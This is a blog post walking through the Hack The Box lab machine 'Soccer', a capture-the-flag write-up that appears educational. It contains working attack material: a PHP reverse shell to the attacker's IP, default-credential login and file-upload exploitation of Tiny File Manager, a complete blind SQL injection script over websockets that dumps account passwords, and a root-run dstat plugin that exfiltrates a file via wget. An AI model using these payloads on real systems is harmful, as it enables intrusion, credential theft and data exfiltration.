<!DOCTYPE html>
<html><head>
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Hack The Box: Soccer - Journal</title><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="Soccer is an easy machine from hackthebox. IT starts with a vulnerable version of tiny file manager with default credentials. This version allows any authenticated users to upload arbitrary files and run php code. After we get a shell, we need to find a subdomain that allows us to find a SQL Injection vulnerability through a websocket service. Exploiting it, gives us credentials to ssh in. Enumerating a bit more as a different user, we spot that the doas config file lets us run dstat with high privileges which leads to the root shell." />
	<meta property="og:image" content=""/>
	<meta property="og:title" content="Hack The Box: Soccer" />
<meta property="og:description" content="Soccer is an easy machine from hackthebox. IT starts with a vulnerable version of tiny file manager with default credentials. This version allows any authenticated users to upload arbitrary files and run php code. After we get a shell, we need to find a subdomain that allows us to find a SQL Injection vulnerability through a websocket service. Exploiting it, gives us credentials to ssh in. Enumerating a bit more as a different user, we spot that the doas config file lets us run dstat with high privileges which leads to the root shell." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://danp.bz/posts/hackthebox-soccer/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-06-10T00:00:00+00:00" />
<meta property="article:modified_time" content="2023-06-10T00:00:00+00:00" />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Hack The Box: Soccer"/>
<meta name="twitter:description" content="Soccer is an easy machine from hackthebox. IT starts with a vulnerable version of tiny file manager with default credentials. This version allows any authenticated users to upload arbitrary files and run php code. After we get a shell, we need to find a subdomain that allows us to find a SQL Injection vulnerability through a websocket service. Exploiting it, gives us credentials to ssh in. Enumerating a bit more as a different user, we spot that the doas config file lets us run dstat with high privileges which leads to the root shell."/>
<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
	<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@1,500&display=swap" rel="stylesheet">
        <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet">
        <link href="https://fonts.googleapis.com/css?family=Roboto+Mono" rel="stylesheet">

	
	<link rel="stylesheet" type="text/css" media="screen" href="https://danp.bz/css/main.5a1df495afe53092e2ad0c172adb2250810f442ca165c5f85673cb3b860f3468.css" />
		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="https://danp.bz/css/dark.134db564d2aacf16987413a93acdb0fdfe7ada0bd1972f2871066b32c9277a7b.css"  disabled />
	

	
	

	
	
	
	
</head>
<body>
        <div class="content"><header>
	<div class="main">
		<a href="https://danp.bz/">Journal</a>
	</div>
	<nav>
		
		<a href="/">Home</a>
		
		<a href="/posts">All posts</a>
		
		<a href="/whoami">Whoami</a>
		
		<a href="/tags">Tags</a>
		
		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
		<script src="https://danp.bz/js/themetoggle.js"></script>
		
	</nav>
</header>

<main>
	<article>
		<div class="title">
			<h1 class="title">Hack The Box: Soccer</h1>
			<div class="meta">Posted on Jun 10, 2023</div>
		</div>
		

		<section class="body">
			<h1 id="sumary">Sumary</h1>
<ul>
<li><a href="#sumary">Sumary</a></li>
<li><a href="#overview">Overview</a></li>
<li><a href="#nmap">Nmap</a>
<ul>
<li><a href="#exploiting-tiny-file-manager">Exploiting tiny file manager</a>
<ul>
<li><a href="#authenticating-with-default-credentials">Authenticating with Default Credentials</a></li>
<li><a href="#uploading-malicious-php-file">Uploading Malicious PHP File</a></li>
</ul>
</li>
<li><a href="#internal-enumeration-as-www-data">Internal Enumeration as www-data</a></li>
</ul>
</li>
<li><a href="#obtaining-credentials-with-sql-injection">Obtaining Credentials With SQL Injection</a></li>
<li><a href="#privilage-escalation-with-doas--dstat">Privilage Escalation with doas + dstat</a></li>
<li><a href="#extra-mile">Extra Mile</a>
<ul>
<li><a href="#exploiting-sql-injection-with-sqlmap">Exploiting SQL Injection with SQLMap</a></li>
</ul>
</li>
</ul>
<h1 id="overview">Overview</h1>
<ol>
<li>Discover <code>soccer.htb</code></li>
<li>Brute force directories to find  <code>tinyfilemanager</code></li>
<li>Exploit a file upload vulnerability to get an initial shell as <code>www-data</code></li>
<li>Internal enumeration to find the <code>soc-player.soccer.htb</code> name</li>
<li>Exploit a SQL Injection vulnerability via websockets to get user and password for the user <code>player</code></li>
<li>ssh in as <code>player</code></li>
<li>Enumerate again and find that the user can run <code>dstat</code> as root through the <code>doas</code> program</li>
<li>Get root</li>
</ol>
<h1 id="nmap">Nmap</h1>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>danp@local:~|â‡’ nmap -sV 10.10.11.194
</span></span><span style="display:flex;"><span>Starting Nmap 7.94 ( https://nmap.org ) at 2023-05-27 22:53 -03
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#fb660a;font-weight:bold">for</span> 10.10.11.194
</span></span><span style="display:flex;"><span>Host is up (0.091s latency).
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#0086f7;font-weight:bold">997</span> closed tcp ports (conn-refused)
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE         VERSION
</span></span><span style="display:flex;"><span>22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
</span></span><span style="display:flex;"><span>80/tcp   open  http            nginx 1.18.0 (Ubuntu)
</span></span><span style="display:flex;"><span>9091/tcp open  xmltec-xmlmail?
</span></span></code></pre></div><p><code>-sV</code>: Enumerate versions from the services</p>
<p>Port <code>80</code> here will be our focus, since port <code>9091</code> just returns 404&rsquo;s and my initial enumeration on it returned nothing.</p>
<h2 id="exploiting-tiny-file-manager">Exploiting tiny file manager</h2>
<p>Accessing the http port we get redirected to <code>soccer.htb</code>, Let&rsquo;s update our <code>/etc/hosts</code> file.</p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>danp@local:~|â‡’  cat /etc/hosts
</span></span><span style="display:flex;"><span><span style="color:#080;background-color:#0f140f;font-style:italic">##</span>
</span></span><span style="display:flex;"><span><span style="color:#080;background-color:#0f140f;font-style:italic"># Host Database</span>
</span></span><span style="display:flex;"><span><span style="color:#080;background-color:#0f140f;font-style:italic">#</span>
</span></span><span style="display:flex;"><span><span style="color:#080;background-color:#0f140f;font-style:italic"># localhost is used to configure the loopback interface</span>
</span></span><span style="display:flex;"><span><span style="color:#080;background-color:#0f140f;font-style:italic"># when the system is booting.  Do not change this entry.</span>
</span></span><span style="display:flex;"><span><span style="color:#080;background-color:#0f140f;font-style:italic">##</span>
</span></span><span style="display:flex;"><span>127.0.0.1	localhost
</span></span><span style="display:flex;"><span>255.255.255.255	broadcasthost
</span></span><span style="display:flex;"><span>::1             localhost
</span></span><span style="display:flex;"><span>10.10.11.194    soccer.htb
</span></span></code></pre></div><p><img src="/soccer-img/Soccer_-_Index.png" alt="img2"></p>
<p>The website is basically a static page and does not tell us much, my next step was to try to enumerate some hidden directories</p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>danp@local:~|â‡’  ~/go/bin/gobuster dir -w ~/Documents/tools/SecLists/Discovery/Web-Content/big.txt -u http://soccer.htb
</span></span><span style="display:flex;"><span>===============================================================
</span></span><span style="display:flex;"><span>Gobuster v3.5
</span></span><span style="display:flex;"><span>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span><span style="display:flex;"><span>===============================================================
</span></span><span style="display:flex;"><span>[+] Url:                     http://soccer.htb
</span></span><span style="display:flex;"><span>[+] Method:                  GET
</span></span><span style="display:flex;"><span>[+] Threads:                 <span style="color:#0086f7;font-weight:bold">10</span>
</span></span><span style="display:flex;"><span>[+] Wordlist:                /Users/danp/Documents/tools/SecLists/Discovery/Web-Content/big.txt
</span></span><span style="display:flex;"><span>[+] Negative Status codes:   <span style="color:#0086f7;font-weight:bold">404</span>
</span></span><span style="display:flex;"><span>[+] User Agent:              gobuster/3.5
</span></span><span style="display:flex;"><span>[+] Timeout:                 <span style="color:#fb660a">10s</span>
</span></span><span style="display:flex;"><span>===============================================================
</span></span><span style="display:flex;"><span>2023/05/27 23:06:03 Starting gobuster in directory enumeration <span style="color:#fb660a">mode</span>
</span></span><span style="display:flex;"><span>===============================================================
</span></span><span style="display:flex;"><span>/.htpasswd            (Status: 403) [Size: 162]
</span></span><span style="display:flex;"><span>/.htaccess            (Status: 403) [Size: 162]
</span></span><span style="display:flex;"><span>/tiny                 (Status: 301) [Size: 178] [--&gt; http://soccer.htb/tiny/]
</span></span><span style="display:flex;"><span>Progress: <span style="color:#0086f7;font-weight:bold">20434</span> / <span style="color:#0086f7;font-weight:bold">20477</span> (99.79%)
</span></span><span style="display:flex;"><span>===============================================================
</span></span><span style="display:flex;"><span>2023/05/27 23:09:17 <span style="color:#fb660a">Finished</span>
</span></span><span style="display:flex;"><span>===============================================================
</span></span></code></pre></div><p><img src="/soccer-img/Tiny_File_Manager.png" alt="img3"></p>
<p>According to the official <a href="https://github.com/prasathmani/tinyfilemanager">Github</a> page:</p>
<blockquote>
<p>TinyFileManager is web based PHP file manager and it is a simple, fast and small size in single-file PHP file that can be dropped into any folder on your server, multi-language ready web application for storing, uploading, editing and managing files and folders online via web browser.</p>
</blockquote>
<h3 id="authenticating-with-default-credentials">Authenticating with Default Credentials</h3>
<p>The first thing I always like to do when I face applications of this kind is to search for default credentials. According to that same github page:</p>
<ul>
<li><code>admin:admin@123</code></li>
<li><code>user:12345</code></li>
</ul>
<p>Using the <code>admin</code> credentials we can successfully login.</p>
<p><em>Notice the version diplayed at the bottom right corner</em></p>
<p><img src="/soccer-img/Tiny_File_Manager-loggedin.png" alt="img4"></p>
<h3 id="uploading-malicious-php-file">Uploading Malicious PHP File</h3>
<p>Searching for vulnerabilities for this particular version, we find <strong>CVE-2021-45010</strong>. This vulnerability allows authenticated users to upload malicious php code and execute arbitrary commands on the server.</p>
<p><em>We can find a pretty good repository with an exploit for this vulnerability here: <a href="https://github.com/febinrev/tinyfilemanager-2.4.3-exploit">Github exploit page</a></em></p>
<p>However, the exploit will not work because the web root is not writable for <code>www-data</code>.</p>
<p><img src="/soccer-img/Tiny_File_Manager-permissions.png" alt="img5"></p>
<p>Inside this <code>tiny</code> folder, there is the <code>uploads</code> folder which has the proper permissions for any user to write inside it, <code>0757</code>.</p>
<p><strong>Check out this <a href="https://www.redhat.com/sysadmin/linux-file-permissions-explained">article</a> on Linux permissions</strong></p>
<p><img src="/soccer-img/Tiny_File_Manager-permissions2.png" alt="img6"></p>
<p>We can create a php file that simply pops a shell in our machine</p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>&lt;?php
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>shell_exec(<span style="color:#0086d2">&#39;bash -c &#34;sh -i &gt;&amp; /dev/tcp/10.10.14.14/9001 0&gt;&amp;1&#34;&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic">?&gt;</span>
</span></span></code></pre></div><p>Let&rsquo;s upload it</p>
<p><img src="/soccer-img/Tiny_File_Manager-fileuploads.png" alt="img7"></p>
<p>now, we can run it by going to <code>/tiny/uploads/shell.php</code></p>
<p><img src="/soccer-img/reverse-shell.png" alt="img8"></p>
<h2 id="internal-enumeration-as-www-data">Internal Enumeration as www-data</h2>
<p>In order to escalate privileges on the machine, we are going to use <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">Linpeas</a> twice. To escalate <code>www-data</code> -&gt; <code>player</code> and <code>player</code> -&gt; <code>root</code>.</p>
<p>Steps to run as <code>www-data</code>:</p>
<ol>
<li>Download the tool to our local machine
<ol>
<li><code>wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh</code></li>
</ol>
</li>
<li>Start a quick http server
<ol>
<li><code>python3 -m http.server 8082</code></li>
</ol>
</li>
<li>Wget the .sh script from the box
<ol>
<li><code>wget http://10.10.14.12:8082/linpeas.sh</code></li>
</ol>
</li>
<li>Run it</li>
</ol>
<p>The <code>Network Information</code> part of Linpeas shows us something interesting</p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£ Network Information â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
</span></span><span style="display:flex;"><span>                              â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
</span></span><span style="display:flex;"><span>â•”â•â•â•â•â•â•â•â•â•â•â•£ Hostname, hosts and DNS
</span></span><span style="display:flex;"><span>soccer
</span></span><span style="display:flex;"><span>127.0.0.1	localhost	soccer	soccer.htb	soc-player.soccer.htb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>127.0.1.1	ubuntu-focal	ubuntu-focal
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>nameserver 127.0.0.53
</span></span><span style="display:flex;"><span>options edns0 trust-ad
</span></span></code></pre></div><p>Another name that we can use <code>soc-player.soccer.htb</code>, let&rsquo;s include it in our local <code>/etc/hosts</code> file and access it</p>
<p><img src="/soccer-img/Soccer_-_Login.png" alt="img8"></p>
<p>We see a small menu on the top left corner with some endpoints. Since other attacks like injecting payloads on the login form and bruteforcing directories did not return anything useful, I just focused on those. So let&rsquo;s create an account and login.</p>
<p>We see a <code>/check</code> endpoint that asks for a ticket number to check if it exists</p>
<h1 id="obtaining-credentials-with-sql-injection">Obtaining Credentials With SQL Injection</h1>
<p><img src="/soccer-img/Soccer_-_Check.png" alt="img9"></p>
<p>Let&rsquo;s see what&rsquo;s going on with burp</p>
<p><img src="/soccer-img/burp1.png" alt="img10"></p>
<p>There is a websocket server that is checking if the ticket is valid or not, let&rsquo;s try to inject some payloads</p>
<p><img src="/soccer-img/burp2.png" alt="img11"></p>
<p>With the payload <code>1 or 1=1</code> we see the confirmation our tests, we have a boolean based SQL Injection.</p>
<p>Since it is using websockets, we cannot send the request directly into <code>sqlmap</code> by default. Let&rsquo;s create an script to exploit it our way :-)</p>
<p>(At the end we exploit it with sqlmap in two ways, this is just for practice)</p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#fb660a;font-weight:bold">from</span> websocket <span style="color:#fb660a;font-weight:bold">import</span> create_connection
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fb660a;font-weight:bold">def</span> <span style="color:#ff0086;font-weight:bold">send_payload</span>(ws, payload, position, offset):
</span></span><span style="display:flex;"><span>    <span style="color:#080;background-color:#0f140f;font-style:italic"># Dump databases</span>
</span></span><span style="display:flex;"><span>    <span style="color:#080;background-color:#0f140f;font-style:italic">#payload = f&#39;1 or (ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT {offset},1),{position},1))) = {payload}--&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#080;background-color:#0f140f;font-style:italic"># Dump soccer_db</span>
</span></span><span style="display:flex;"><span>    <span style="color:#080;background-color:#0f140f;font-style:italic">#payload = f&#39;1 or (ascii(substr((SELECT table_name FROM information_schema.TABLES WHERE table_schema=\&#39;soccer_db\&#39; LIMIT {offset},1),{position},1))) = {payload}--&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#080;background-color:#0f140f;font-style:italic"># Dump Columns from accounts table</span>
</span></span><span style="display:flex;"><span>    <span style="color:#080;background-color:#0f140f;font-style:italic">#payload = f&#39;1 or (ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME=\&#39;accounts\&#39; LIMIT {offset},1),{position},1))) = {payload}--&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#080;background-color:#0f140f;font-style:italic">#Dump Data</span>
</span></span><span style="display:flex;"><span>    payload = <span style="color:#0086d2">f</span><span style="color:#0086d2">&#39;1 or (ascii(substr((SELECT HOST FROM accounts LIMIT </span><span style="color:#0086d2">{</span>offset<span style="color:#0086d2">}</span><span style="color:#0086d2">,1),</span><span style="color:#0086d2">{</span>position<span style="color:#0086d2">}</span><span style="color:#0086d2">,1))) = </span><span style="color:#0086d2">{</span>payload<span style="color:#0086d2">}</span><span style="color:#0086d2">--&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ws.send(<span style="color:#0086d2">&#39;{&#34;id&#34;: &#34;&#39;</span>+payload+<span style="color:#0086d2">&#39;&#34;}&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#fb660a;font-weight:bold">return</span> ws.recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fb660a;font-weight:bold">def</span> <span style="color:#ff0086;font-weight:bold">main</span>():
</span></span><span style="display:flex;"><span>    URL = <span style="color:#0086d2">&#39;ws://soccer.htb:9091/&#39;</span>
</span></span><span style="display:flex;"><span>    ws = create_connection(URL)
</span></span><span style="display:flex;"><span>    print(<span style="color:#0086d2">&#34;============ Start Dumping Info ============&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#fb660a;font-weight:bold">for</span> r in range(<span style="color:#0086f7;font-weight:bold">10</span>):
</span></span><span style="display:flex;"><span>        print(<span style="color:#0086d2">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#fb660a;font-weight:bold">for</span> k in range(<span style="color:#0086f7;font-weight:bold">1</span>, <span style="color:#0086f7;font-weight:bold">20</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#fb660a;font-weight:bold">for</span> i in range(<span style="color:#0086f7;font-weight:bold">33</span>, <span style="color:#0086f7;font-weight:bold">127</span>):
</span></span><span style="display:flex;"><span>                response = send_payload(ws, i, k, r)
</span></span><span style="display:flex;"><span>                <span style="color:#fb660a;font-weight:bold">if</span> <span style="color:#0086d2">&#34;Ticket Exists&#34;</span> in response:
</span></span><span style="display:flex;"><span>                    print(chr(i), end=<span style="color:#0086d2">&#39;&#39;</span>, flush=<span style="color:#fb660a;font-weight:bold">True</span>)
</span></span><span style="display:flex;"><span>                    <span style="color:#080;background-color:#0f140f;font-style:italic">#print(chr(i))</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#fb660a;font-weight:bold">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fb660a;font-weight:bold">if</span> __name__ == <span style="color:#0086d2">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    main()%
</span></span></code></pre></div><p>Before we are able to extract any user&rsquo;s data, we have to find how they&rsquo;re being stored inside the database. The script has all the payloads I used to dump the information I needed, let&rsquo;s run one by one.</p>
<p>The first step is to discover the database name, the payload for that is:</p>
<p><code>payload = f'1 or (ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT {offset},1),{position},1))) = {payload}--'</code></p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>danp@local:~/Documents/HackTheBox/Soccer|â‡’  python3 websocket-sqlinjection.py
</span></span><span style="display:flex;"><span>============ Start Dumping <span style="color:#fb660a">Info</span> ============
</span></span><span style="display:flex;"><span>mysql
</span></span><span style="display:flex;"><span>information_schema
</span></span><span style="display:flex;"><span>performance_schema
</span></span><span style="display:flex;"><span>sys
</span></span><span style="display:flex;"><span>soccer_db
</span></span></code></pre></div><p>We discover the database <code>soccer_db</code>, now let&rsquo;s find out its tables:</p>
<p><code>payload = f'1 or (ascii(substr((SELECT table_name FROM information_schema.TABLES WHERE table_schema=\'soccer_db\' LIMIT {offset},1),{position},1))) = {payload}--'</code></p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>danp@local:~/Documents/HackTheBox/Soccer|â‡’  python3 websocket-sqlinjection.py
</span></span><span style="display:flex;"><span>============ Start Dumping <span style="color:#fb660a">Info</span> ============
</span></span><span style="display:flex;"><span>accounts
</span></span></code></pre></div><p>The <strong>accounts</strong> table is what we want, We could guess that username and password are the fields we must dump, but let&rsquo;s dump the column&rsquo;s names too just to make sure we are not missing anything</p>
<p><code>payload = f'1 or (ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME=\'accounts\' LIMIT {offset},1),{position},1))) = {payload}--'</code></p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>danp@local:~/Documents/HackTheBox/Soccer|â‡’  python3 websocket-sqlinjection.py
</span></span><span style="display:flex;"><span>============ Start Dumping <span style="color:#fb660a">Info</span> ============
</span></span><span style="display:flex;"><span>CURRENT_CONNECTIONS
</span></span><span style="display:flex;"><span>HOST
</span></span><span style="display:flex;"><span>MAX_SESSION_CONTROL
</span></span><span style="display:flex;"><span>MAX_SESSION_TOTAL_M
</span></span><span style="display:flex;"><span>TOTAL_CONNECTIONS
</span></span><span style="display:flex;"><span>USER
</span></span><span style="display:flex;"><span>email
</span></span><span style="display:flex;"><span>id
</span></span><span style="display:flex;"><span>password
</span></span><span style="display:flex;"><span>username
</span></span></code></pre></div><p>The next payload extracts the users from the accounts table:</p>
<p><code>payload = f'1 or (ascii(substr((SELECT username FROM accounts LIMIT {offset},1),{position},1))) = {payload}--'</code></p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>danp@local:~/Documents/HackTheBox/Soccer|â‡’  python3 websocket-sqlinjection.py
</span></span><span style="display:flex;"><span>============ Start Dumping <span style="color:#fb660a">Info</span> ============
</span></span><span style="display:flex;"><span>player
</span></span></code></pre></div><p>Now the passwords:</p>
<p><code>payload = f'1 or (ascii(substr((SELECT password FROM accounts LIMIT {offset},1),{position},1))) = {payload}--'</code></p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>danp@local:~/Documents/HackTheBox/Soccer|â‡’  python3 websocket-sqlinjection.py
</span></span><span style="display:flex;"><span>============ Start Dumping <span style="color:#fb660a">Info</span> ============
</span></span><span style="display:flex;"><span>PlayerOftheMatch2022
</span></span></code></pre></div><p>We find the credentials for player user: <code>player:PlayerOftheMatch2022</code></p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>danp@local:~/Documents/HackTheBox/Soccer|â‡’  ssh player@soccer.htb
</span></span><span style="display:flex;"><span>player@soccer.htb&#39;s password:
</span></span><span style="display:flex;"><span>Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)
</span></span><span style="display:flex;"><span>          ..........
</span></span><span style="display:flex;"><span>Last login: Mon May <span style="color:#0086f7;font-weight:bold">29</span> 19:13:05 <span style="color:#0086f7;font-weight:bold">2023</span> from 10.10.14.14
</span></span><span style="display:flex;"><span>player@soccer:~$ cat user.txt
</span></span><span style="display:flex;"><span>daba77&lt;redacted&gt;db3e
</span></span></code></pre></div><h1 id="privilage-escalation-with-doas--dstat">Privilage Escalation with doas + dstat</h1>
<p>Our focus now, is to figure out what the <code>player</code> can do that <code>www-data</code> could not. Let&rsquo;s run Linpeas again with that in mind.</p>
<p>Paying close attention to the <strong>Software Information</strong> part, one binary caught my attention</p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£ Software Information â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
</span></span><span style="display:flex;"><span>                             â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
</span></span><span style="display:flex;"><span>â•”â•â•â•â•â•â•â•â•â•â•â•£ Useful software
</span></span><span style="display:flex;"><span>/usr/bin/base64
</span></span><span style="display:flex;"><span>/usr/bin/curl
</span></span><span style="display:flex;"><span>/usr/local/bin/doas
</span></span><span style="display:flex;"><span>/usr/bin/g++
</span></span><span style="display:flex;"><span>/usr/bin/gcc
</span></span><span style="display:flex;"><span>/snap/bin/lxc
</span></span><span style="display:flex;"><span>/usr/bin/make
</span></span><span style="display:flex;"><span>/usr/bin/nc
</span></span><span style="display:flex;"><span>/usr/bin/netcat
</span></span><span style="display:flex;"><span>/usr/bin/perl
</span></span><span style="display:flex;"><span>/usr/bin/php
</span></span><span style="display:flex;"><span>/usr/bin/ping
</span></span><span style="display:flex;"><span>/usr/bin/python3
</span></span><span style="display:flex;"><span>/usr/bin/sudo
</span></span><span style="display:flex;"><span>/usr/bin/wget
</span></span></code></pre></div><p>The <strong>/usr/local/bin/doas</strong> was unknows to me, googling a lit bit about it and like sudo, doas is used to assume the identity of another user on the system. Enumerating its configurations according to this <a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/doas/">page</a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>player@soccer:/dev/shm$ find / -type f -name <span style="color:#0086d2">&#34;doas.conf&#34;</span> 2&gt;/dev/null
</span></span><span style="display:flex;"><span>/usr/local/etc/doas.conf
</span></span><span style="display:flex;"><span>player@soccer:/dev/shm$ cat /usr/local/etc/doas.conf
</span></span><span style="display:flex;"><span>permit nopass player as root cmd /usr/bin/dstat
</span></span></code></pre></div><p>So we can use <code>/usr/bin/dstat</code> as root. <a href="https://gtfobins.github.io/gtfobins/dstat/">gtfobins</a> teaches us how to exploit:</p>
<ol>
<li>Create a file named <code>dstat_&lt;module&gt;.py</code></li>
<li>Place it in inside <code>/usr/local/share/dstat/</code></li>
<li>Run <code>doas -u root /usr/bin/dstat --&lt;module&gt;</code></li>
</ol>
<p>I created a module that simply send a http request with the root.txt content to my server and called it <code>dstat_danp.py</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#fb660a;font-weight:bold">import</span> os
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>os.system(<span style="color:#0086d2">&#34;wget http://10.10.14.14:8082/$(cat /root/root.txt)&#34;</span>)
</span></span></code></pre></div><p>After sending the file to <code>/usr/local/share/dstat/</code> I was able to run the command <code>doas -u root /usr/bin/dstat --danp</code> and grab the final flag!</p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>player@soccer:/dev/shm$ doas -u root /usr/bin/dstat --danp
</span></span><span style="display:flex;"><span>/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module<span style="color:#0086d2">&#39;s documentation for alternative uses
</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">  import imp
</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">--2023-05-29 20:22:01--  http://10.10.14.14:8082/39278&lt;redacted&gt;0ac1  ### Root flag here
</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">Connecting to 10.10.14.14:8082... connected.
</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">HTTP request sent, awaiting response... 404 File not found
</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">2023-05-29 20:22:01 ERROR 404: File not found.
</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">
</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">Module dstat_danp failed to load. (name &#39;</span>dstat_plugin&#39; is not defined)
</span></span><span style="display:flex;"><span>None of the stats you selected are available.
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>danp@local:~/Documents/HackTheBox/Soccer|â‡’  python3 -m http.server <span style="color:#0086f7;font-weight:bold">8082</span>
</span></span><span style="display:flex;"><span>Serving HTTP on :: port <span style="color:#0086f7;font-weight:bold">8082</span> (http://[::]:8082/) ...
</span></span><span style="display:flex;"><span>::ffff:10.10.11.194 - - [29/May/2023 17:22:07] code 404, message File not found
